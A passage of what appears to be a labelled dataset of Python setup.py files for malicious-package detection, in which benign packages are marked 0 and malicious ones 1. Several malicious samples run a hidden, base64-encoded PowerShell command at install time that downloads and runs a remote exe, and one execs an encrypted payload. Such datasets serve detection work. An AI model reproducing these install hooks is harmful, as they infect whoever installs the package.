3.10\nProgramming Language :: Python :: Implementation :: CPython\nProgramming Language :: Python :: Implementation :: PyPy\nTopic :: Software Development :: Quality Assurance\nTopic :: Software Development :: Testing\nDevelopment Status :: 5 - Production/Stable\nFramework :: Django\nFramework :: Django :: 1.8\nFramework :: Django :: 1.11\nFramework :: Django :: 2.2\nFramework :: Django :: 3.2\nFramework :: Django :: 4.0\n\"\"\"\n\nsetup(\n    name='django_coverage_plugin',\n    version='2.0.3',\n    description='Django template coverage.py plugin',\n    long_description=(\n        re.compile(\n            '^.. start-badges.*^.. end-badges',\n            re.M | re.S,\n        ).sub('', read('README.rst'))\n    ),\n    long_description_content_type='text/x-rst',\n    author='Ned Batchelder',\n    author_email='ned@nedbatchelder.com',\n    url='https://github.com/nedbat/django_coverage_plugin',\n    packages=['django_coverage_plugin'],\n    install_requires=[\n        'coverage',\n        'six >= 1.4.0',\n    ],\n    license='Apache 2.0',\n    classifiers=classifiers.splitlines(),\n)\n", "target": 0}
{"idx": "fpdf2-2.5.5", "func": "#!/usr/bin/env python\n\nimport re\nfrom pathlib import Path\n\nfrom setuptools import find_packages, setup\n\n\nif __name__ == \"__main__\":\n    version = re.findall(\n        r'FPDF_VERSION = \"(\\d+.\\d+.\\d+[^\"]*)\"',\n        Path(\"fpdf/fpdf.py\").read_text(encoding=\"utf-8\"),\n    )[0]\n    setup(\n        name=\"fpdf2\",\n        version=version,\n        description=\"Simple & fast PDF generation for Python\",\n        long_description=Path(\"README.md\").read_text(encoding=\"utf-8\"),\n        long_description_content_type=\"text/markdown\",\n        author=\"Olivier PLATHEY ported by Max\",\n        maintainer=\"Lucas Cimon\",\n        url=\"https://pyfpdf.github.io/fpdf2/\",\n        download_url=f\"https://github.com/PyFPDF/fpdf2/tarball/{version}\",\n        project_urls={\n            \"Documentation\": \"https://pyfpdf.github.io/fpdf2/\",\n            \"Code\": \"https://github.com/PyFPDF/fpdf2\",\n            \"Issue tracker\": \"https://github.com/PyFPDF/fpdf2/issues\",\n        },\n        license=\"LGPLv3+\",\n        packages=find_packages(),\n        package_dir={\"fpdf\": \"fpdf\"},\n        install_requires=[\n            \"defusedxml\",\n            \"Pillow>=6.2.2\",  # minimum version tested there: https://github.com/PyFPDF/fpdf2/actions/runs/2295868575\n        ],\n        classifiers=[\n            \"Development Status :: 5 - Production/Stable\",\n            \"Intended Audience :: Developers\",\n            \"License :: OSI Approved :: GNU Lesser General Public License v3 (LGPLv3)\",\n            \"Programming Language :: Python\",\n            \"Programming Language :: Python :: 3.6\",\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Operating System :: OS Independent\",\n            \"Topic :: Printing\",\n            \"Topic :: Software Development :: Libraries :: Python Modules\",\n            \"Topic :: Text Processing :: Markup\",\n            \"Topic :: Multimedia :: Graphics\",\n            \"Topic :: Multimedia :: Graphics :: Presentation\",\n        ],\n        keywords=[\"pdf\", \"unicode\", \"png\", \"jpg\", \"ttf\", \"barcode\"],\n    )\n", "target": 0}
{"idx": "DendroPy-4.5.2", "func": "#! /usr/bin/env python\n# -*- coding: utf-8 -*-\n\n##############################################################################\n##  DendroPy Phylogenetic Computing Library.\n##\n##  Copyright 2010-2015 Jeet Sukumaran and Mark T. Holder.\n##  All rights reserved.\n##\n##  See \"LICENSE.rst\" for terms and conditions of usage.\n##\n##  If you use this work or any portion thereof in published work,\n##  please cite it as:\n##\n##     Sukumaran, J. and M. T. Holder. 2010. DendroPy: a Python library\n##     for phylogenetic computing. Bioinformatics 26: 1569-1571.\n##\n##############################################################################\n\n\"\"\"\nPackage setup and installation.\n\"\"\"\n\nimport sys\nimport re\nimport os\nimport io\n\n###############################################################################\n### \"highly-discouraged\" workaround to deal with Python 2.8+ and 3.4+ verifying\n### certificates by default; this breaks PyPI uploads ...\nimport ssl\nif hasattr(ssl, '_create_unverified_context'):\n    ssl._create_default_https_context = ssl._create_unverified_context\n\n###############################################################################\n## Utility\n\ndef _read(names, **kwargs):\n    path = os.path.join(os.path.dirname(__file__), *names)\n    if sys.version_info.major < 3:\n        return open(path, \"rU\").read()\n    else:\n        with open(path, encoding=kwargs.get('encoding', 'utf8')) as src:\n            s = src.read()\n        return s\n\ndef _compose_list(values, prefix=None):\n    if prefix is None:\n        prefix = \"\"\n    s = []\n    max_len = max(len(i) for i in values)\n    template = \"{}{{value:<{}}}\".format(prefix,max_len)\n    for v in values:\n        s.append(template.format(value=v))\n    return \"\\n\".join(s)\n\n###############################################################################\n# Identification\n\n__version__ = re.match(r\".*^__version__\\s*=\\s*['\\\"](.*?)['\\\"]\\s*$.*\", _read([\"src\", \"dendropy\", \"__init__.py\"]), re.S | re.M).group(1)\nsys.stderr.write(\"-setup.py: DendroPy version {}\\n\".format(__version__))\n\n###############################################################################\n# setuptools/distutils/etc. import and configuration\n\ntry:\n    import setuptools\n    try:\n        setuptools_path = \" ('\" +  os.path.abspath(setuptools.__file__) + \"')\"\n    except OSError:\n        setuptools_path = \"\"\n    sys.stderr.write(\"-setup.py: using setuptools{}\\n\".format(setuptools_path))\n    from setuptools import setup, find_packages\nexcept ImportError as e:\n    sys.stderr.write(\"-setup.py: using distutils\\n\")\n    from distutils.core import setup\n    sys.stderr.write(\"-setup.py: using canned package list\\n\")\n    PACKAGES = [\n            \"dendropy\",\n            \"dendropy.calculate\",\n            \"dendropy.dataio\",\n            \"dendropy.datamodel\",\n            \"dendropy.interop\",\n            \"dendropy.legacy\",\n            \"dendropy.mathlib\",\n            \"dendropy.model\",\n            \"dendropy.simulate\",\n            \"dendropy.utility\",\n            \"dendropy.utility.libexec\",\n            ]\nelse:\n    sys.stderr.write(\"-setup.py: searching for packages\\n\")\n    PACKAGES = find_packages(\"src\")\nEXTRA_KWARGS = dict(\n    install_requires = ['setuptools'],\n    include_package_data = True,\n    test_suite = \"tests\",\n    zip_safe = True,\n    )\n\nsys.stderr.write(\"-setup.py: packages identified:\\n{}\\n\".format(_compose_list(PACKAGES, prefix=\"           - \")))\nENTRY_POINTS = {}\n\n###############################################################################\n# Script paths\n\nSCRIPT_SUBPATHS = [\n    ['applications', 'sumtrees', 'sumtrees.py'],\n    ['applications', 'sumlabels', 'sumlabels.py'],\n    ['applications', 'dendropy-format', 'dendropy-format'],\n    # ['scripts', 'sumtrees', 'cattrees.py'],\n    # ['scripts', 'calculators', 'strict_consensus_merge.py'],\n    # ['scripts', 'calculators', 'long_branch_symmdiff.py'],\n]\nSCRIPTS = [os.path.join(*i) for i in SCRIPT_SUBPATHS]\nsys.stderr.write(\"-setup.py: scripts identified:\\n{}\\n\".format(_compose_list(SCRIPTS, prefix=\"           - \")))\n\n###############################################################################\n# setuptools/distuils command extensions\n\ntry:\n    from setuptools import Command\nexcept ImportError:\n    sys.stderr.write(\"-setup.py: setuptools.Command could not be imported: setuptools extensions not available\\n\")\nelse:\n    sys.stderr.write(\"-setup.py: setuptools command extensions are available\\n\")\n    command_hook = \"distutils.commands\"\n    ENTRY_POINTS[command_hook] = []\n\n    ###########################################################################\n    # coverage\n    # from dendropy.test.support import coverage_analysis\n    # if coverage_analysis.DENDROPY_COVERAGE_ANALYSIS_AVAILABLE:\n    #     sys.stderr.write(\"-setup.py: coverage analysis available ('python setup.py coverage')\\n\")\n    #     ENTRY_POINTS[command_hook].append(\"coverage = dendropy.test.support.coverage_analysis:CoverageAnalysis\")\n    # else:\n    #     sys.stderr.write(\"-setup.py: coverage analysis not available\\n\")\n\n\n###############################################################################\n# Main setup\n\n### compose long description ###\nlong_description = _read([\"README.rst\"])\nlong_description = long_description.replace(\"DendroPy-4.x.x\", \"DendroPy-{}\".format(__version__))\nlong_description = long_description.replace(\"\"\"download the source code archive\"\"\",\n    \"\"\"`download the source code archive <http://pypi.python.org/packages/source/D/DendroPy/DendroPy-{}.tar.gz>`_\"\"\".format(__version__))\n\nlong_description = long_description + (\"\"\"\\\n\nCurrent Release\n===============\n\nThe current release of DendroPy is version {}.\n\n\"\"\".format(__version__))\n\nsetup(name='DendroPy',\n      version=__version__,\n      author='Jeet Sukumaran and Mark T. Holder',\n      author_email='jeetsukumaran@gmail.com, mtholder@ku.edu',\n      url='http://packages.python.org/DendroPy/',\n      description=\"A Python library for phylogenetics and phylogenetic computing: reading, writing, simulation, processing and manipulation of phylogenetic trees (phylogenies) and characters.\",\n      license='BSD',\n      packages=PACKAGES,\n      package_dir={\"\": \"src\"},\n      # not needed?\n      # package_data={\n      #     # \"dendropy.utility\" : [\"libexec/*\"],\n      #     },\n      scripts = SCRIPTS,\n      long_description=long_description,\n      entry_points = ENTRY_POINTS,\n      classifiers = [\n            \"Intended Audience :: Developers\",\n            \"Intended Audience :: Science/Research\",\n            \"License :: OSI Approved :: BSD License\",\n            \"Natural Language :: English\",\n            \"Operating System :: OS Independent\",\n            \"Programming Language :: Python :: 2.7\",\n            \"Programming Language :: Python :: 3\",\n            \"Programming Language :: Python :: 3.1\",\n            \"Programming Language :: Python :: 3.2\",\n            \"Programming Language :: Python :: 3.3\",\n            \"Programming Language :: Python :: 3.4\",\n            \"Programming Language :: Python :: 3.5\",\n            \"Programming Language :: Python :: 3.6\",\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python\",\n            \"Topic :: Scientific/Engineering :: Bio-Informatics\",\n            ],\n      keywords='phylogenetics phylogeny phylogenies phylogeography evolution evolutionary biology systematics coalescent population genetics phyloinformatics bioinformatics',\n      **EXTRA_KWARGS\n      )\n", "target": 0}
{"idx": "fuzzywuzzy-0.18.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n# Copyright (c) 2014 SeatGeek\n\n# This file is part of fuzzywuzzy.\n\nfrom fuzzywuzzy import __version__\nimport os\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\ndef open_file(fname):\n    return open(os.path.join(os.path.dirname(__file__), fname))\n\nsetup(\n    name='fuzzywuzzy',\n    version=__version__,\n    author='Adam Cohen',\n    author_email='adam@seatgeek.com',\n    packages=['fuzzywuzzy'],\n    extras_require={'speedup': ['python-levenshtein>=0.12']},\n    url='https://github.com/seatgeek/fuzzywuzzy',\n    license=\"GPLv2\",\n    classifiers=[\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: GNU General Public License v2 (GPLv2)',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n    ],\n    description='Fuzzy string matching in python',\n    long_description=open_file('README.rst').read(),\n    zip_safe=True,\n)\n", "target": 0}
{"idx": "pongreplace-1.17", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pongreplace',\n    packages = ['modlib'],\n    version = '5.84',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-use-pathlib-0.3.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['flake8_use_pathlib']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['flake8>=3.6']\n\nentry_points = \\\n{'flake8.extension': ['PL = flake8_use_pathlib:PathlibChecker']}\n\nsetup_kwargs = {\n    'name': 'flake8-use-pathlib',\n    'version': '0.3.0',\n    'description': 'A plugin for flake8 finding use of functions that can be replaced by pathlib module.',\n    'long_description': '# flake8-use-pathlib\\n\\n[![pypi][pypi-badge]](https://pypi.org/project/flake8-use-pathlib/)\\n[![black][black-badge]](https://github.com/psf/black)\\n\\nA plugin for flake8 finding use of functions that can be replaced by pathlib module.\\n\\n[pypi-badge]: https://badgen.net/pypi/v/flake8-use-pathlib\\n[black-badge]: https://badgen.net/badge/code%20style/black/black/\\n\\n## Installation\\n\\nInstall from `pip` with:\\n\\n`pip install flake8-use-pathlib`\\n\\n## Rules\\n\\n| Code  | Rule                                                                                         |\\n| ----- | -------------------------------------------------------------------------------------------- |\\n| PL100 | os.path.abspath(\"foo\") should be replaced by foo_path.resolve()                              |\\n| PL101 | os.chmod(\"foo\", 0o444) should be replaced by foo_path.chmod(0o444)                           |\\n| PL102 | os.mkdir(\"foo\") should be replaced by foo_path.mkdir()                                       |\\n| PL103 | os.makedirs(\"foo/bar\") should be replaced by bar_path.mkdir(parents=True)                    |\\n| PL104 | os.rename(\"foo\", \"bar\") should be replaced by foo_path.rename(Path(\"bar\"))                   |\\n| PL105 | os.replace(\"foo\", \"bar\") should be replaced by foo_path.replace(Path(\"bar\"))                 |\\n| PL106 | os.rmdir(\"foo\") should be replaced by foo_path.rmdir()                                       |\\n| PL107 | os.remove(\"foo\") should be replaced by foo_path.unlink()                                     |\\n| PL108 | os.unlink(\"foo\") should be replaced by foo_path.unlink()                                     |\\n| PL109 | os.getcwd() should be replaced by Path.cwd()                                                 |\\n| PL110 | os.path.exists(\"foo\") should be replaced by foo_path.exists()                                |\\n| PL111 | os.path.expanduser(\"~/foo\") should be replaced by foo_path.expanduser()                      |\\n| PL112 | os.path.isdir(\"foo\") should be replaced by foo_path.is_dir()                                 |\\n| PL113 | os.path.isfile(\"foo\") should be replaced by foo_path.is_file()                               |\\n| PL114 | os.path.islink(\"foo\") should be replaced by foo_path.is_symlink()                            |\\n| PL115 | os.readlink(\"foo\") should be replaced by foo_path.readlink()                                 |\\n| PL116 | os.stat(\"foo\") should be replaced by foo_path.stat() or foo_path.owner() or foo_path.group() |\\n| PL117 | os.path.isabs should be replaced by foo_path.is_absolute()                                   |\\n| PL118 | os.path.join(\"foo\", \"bar\") should be replaced by foo_path / \"bar\"                            |\\n| PL119 | os.path.basename(\"foo/bar\") should be replaced by bar_path.name                              |\\n| PL120 | os.path.dirname(\"foo/bar\") should be replaced by bar_path.parent                             |\\n| PL121 | os.path.samefile(\"foo\", \"bar\") should be replaced by foo_path.samefile(bar_path)             |\\n| PL122 | os.path.splitext(\"foo.bar\") should be replaced by foo_path.suffix                            |\\n| PL123 | open(\"foo\") should be replaced by Path(\"foo\").open()                                         |\\n| PL124 | py.path.local is in maintenance mode, use pathlib instead                                    |\\n',\n    'author': 'Rodolphe Pelloux-Prayer',\n    'author_email': 'rodolphe@damsy.net',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://gitlab.com/RoPP/flake8-use-pathlib',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.7',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "selfcandyintpyw-7.62", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcandyintpyw',\n    packages = ['modlib'],\n    version = '7.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-c0red-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'YgtczCygLFnszniQkfAUrAGqzULUjrkJoUMnxbiIMHyUzrYmbDWNKlYoIcieezXS NBZbQVBgYnqTApGXIu'\nLONG_DESCRIPTION = 'JTCAqPLcGAdcZWoGlfkPCKrQSKtzgWHiKpaUbLrgVNToyUvGChrvOAEJjzBSwFnIdSDzIffiaSkuYndHAZZTZbRC oPMgZyiQsEYbirXUobUqoRZYXAWpYgtELxzBXDwJjfuMlNuHvvrzUhATCTMxmazlarGoqPfjUluxxUdXjPRICeuOeezmWkmUHbPbichaFHOGvE t BFsmyZbrRpihnwKnPTyYeirBHGNtXwrTjNVoSzgexdBiFbBQCIXdGAWLDsBTkBQiqc ROAfhBSZyUYarBNGxFygsYGfOeMWxDPWPlXEvsVjRGRKgvgXtznvCyvvLcRgtdNuLzSnRdpypcsbuXY bSKeKFxwQKMjvqnZCoTGBJrPaDzDdTodLVxyRgUWEdNDAQNuVYhssOw lwxYZyVoGsKerQKjbXdmzkQoqFGoHUQ'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'GQ6YH72AO9Qq3KUaXX-vNeNZxMHJrc53whTLYFyfVJQ=').decrypt(b'gAAAAABmA1M3E1B5R1CaaJ3fzUFT1SCoksUbn-VmvlZkytxND_q8HQ-8dGX5z06OddjWORGrFXsILaHs0meiINp5SRQxGwacZGHmbNTSSCH9qeXYj_1lzAyz9Na-E9VtSE8VRQNCOFXB7C44RllzB9YEozCiwx5rZXGMbKOt2NVvE0RdTJB6Wa-STDy4Xpj971Du3TIm8S-6_6yeizDRWk_X8jvANewuJyHbsWbBLL6ask4R1drmS4o='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"py-c0red\",\n    version=VERSION,\n    author=\"UabBPvWmwn\",\n    author_email=\"hwpJXU@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "proofsplit-10.39", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'proofsplit',\n    packages = ['modlib'],\n    version = '2.12',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dask-2022.8.0", "func": "#!/usr/bin/env python\n\nfrom __future__ import annotations\n\nimport sys\nfrom os.path import exists\n\nfrom setuptools import setup\n\nimport versioneer\n\n# NOTE: These are tested in `continuous_integration/test_imports.sh` If\n# you modify these, make sure to change the corresponding line there.\nextras_require: dict[str, list[str]] = {\n    \"array\": [\"numpy >= 1.18\"],\n    \"bag\": [],  # keeping for backwards compatibility\n    \"dataframe\": [\"numpy >= 1.18\", \"pandas >= 1.0\"],\n    \"distributed\": [\"distributed == 2022.8.0\"],\n    \"diagnostics\": [\n        \"bokeh >= 2.4.2\",\n        \"jinja2\",\n    ],\n    \"delayed\": [],  # keeping for backwards compatibility\n}\nextras_require[\"complete\"] = sorted({v for req in extras_require.values() for v in req})\n# after complete is set, add in test\nextras_require[\"test\"] = [\n    \"pandas[test]\",\n    \"pytest\",\n    \"pytest-rerunfailures\",\n    \"pytest-xdist\",\n    \"pre-commit\",\n]\n\ninstall_requires = [\n    \"cloudpickle >= 1.1.1\",\n    \"fsspec >= 0.6.0\",\n    \"packaging >= 20.0\",\n    \"partd >= 0.3.10\",\n    \"pyyaml >= 5.3.1\",\n    \"toolz >= 0.8.2\",\n]\n\npackages = [\n    \"dask\",\n    \"dask.array\",\n    \"dask.bag\",\n    \"dask.bytes\",\n    \"dask.dataframe\",\n    \"dask.dataframe.io\",\n    \"dask.dataframe.tseries\",\n    \"dask.diagnostics\",\n]\n\ntests = [p + \".tests\" for p in packages]\n\n# Only include pytest-runner in setup_requires if we're invoking tests\nif {\"pytest\", \"test\", \"ptr\"}.intersection(sys.argv):\n    setup_requires = [\"pytest-runner\"]\nelse:\n    setup_requires = []\n\nsetup(\n    name=\"dask\",\n    version=versioneer.get_version(),\n    cmdclass=versioneer.get_cmdclass(),\n    description=\"Parallel PyData with Task Scheduling\",\n    url=\"https://github.com/dask/dask/\",\n    maintainer=\"Matthew Rocklin\",\n    maintainer_email=\"mrocklin@gmail.com\",\n    license=\"BSD\",\n    keywords=\"task-scheduling parallel numpy pandas pydata\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Scientific/Engineering\",\n        \"Topic :: System :: Distributed Computing\",\n    ],\n    packages=packages + tests,\n    long_description=open(\"README.rst\").read() if exists(\"README.rst\") else \"\",\n    python_requires=\">=3.8\",\n    install_requires=install_requires,\n    setup_requires=setup_requires,\n    tests_require=[\"pytest\"],\n    extras_require=extras_require,\n    include_package_data=True,\n    zip_safe=False,  # https://mypy.readthedocs.io/en/latest/installed_packages.html\n)\n", "target": 0}
{"idx": "py-hackedccencode-5.77", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-hackedccencode',\n    packages = ['modlib'],\n    version = '5.11',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-loadpongsplit-2.94", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-loadpongsplit',\n    packages = ['modlib'],\n    version = '10.77',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
